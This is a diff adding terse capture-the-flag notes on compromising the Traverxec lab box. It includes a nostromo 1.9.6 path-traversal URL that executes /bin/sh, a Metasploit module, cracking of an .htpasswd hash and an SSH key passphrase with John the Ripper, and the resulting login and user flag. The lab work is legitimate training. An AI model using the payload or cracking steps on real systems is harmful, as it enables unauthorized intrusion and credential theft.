@@ -1,0 +1,64 @@
+nmap returned the webpage is running the service - nostromo 1.9.6
+
+command execution using the url /.%0d./.%0d./.%0d./.%0d./bin/sh
+
+recieved  passwd, htpasswd
+
+david's password hash was located at .htpasswd
+	- cracked using john the ripper 
+	password: Nowonly4me
+
+used cve to access the box as user www-data 
+https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html
+
+msf5 exploit(multi/http/nostromo_code_exec) > 
+
+-------
+
+We could not view the contents of david's directory but knew that files existed there
+So we can still cd up a level to /home/david/public_www/protected_files_area/
+
+Found a compressed .tgz file containing ssh keys
+	- base64 copy and pasted it to my directory
+	- md5sum to check the validity 
+
+untared it and recived a directory /home/david/.ssh with 3 files in it
+	- authorized_keys
+	- id_rsa
+	- id_rsa.pub
+
+	where id_rsa is the private key which we DO NOT have the password for... We do.. it just doesnt work when trying to ssh as user david..
+	and we have found a public key
+
+---------
+Like Postman we will use ssh2john to put put the file in the correct brute force format for john to read. 
+
+	python ssh2john.py  id_rsa > id_rsa_ssh2johned
+
+and then we brute force it
+	
+	john --wordlist-/usr/share/wordlists/rockyou.txt id_rsa_ssh2johned
+
+ing default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (id_rsa)
+1g 0:00:00:07 DONE (2019-12-11 14:11) 0.1422g/s 2040Kp/s 2040Kc/s 2040KC/s *7¡Vamos!
+Session completed
+
+
+the password to decyrpt the id_rsa file is hunter
+
+----------
+ssh -i tmp david@10.10.10.165
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Wed Dec 11 15:01:15 2019 from 10.10.15.141
+david@traverxec:~$ ls
+bin  lse.sh  public_www  user.txt
+david@traverxec:~$ cat user.txt
+7db0b48469606a42cec20750d9782f3d
+
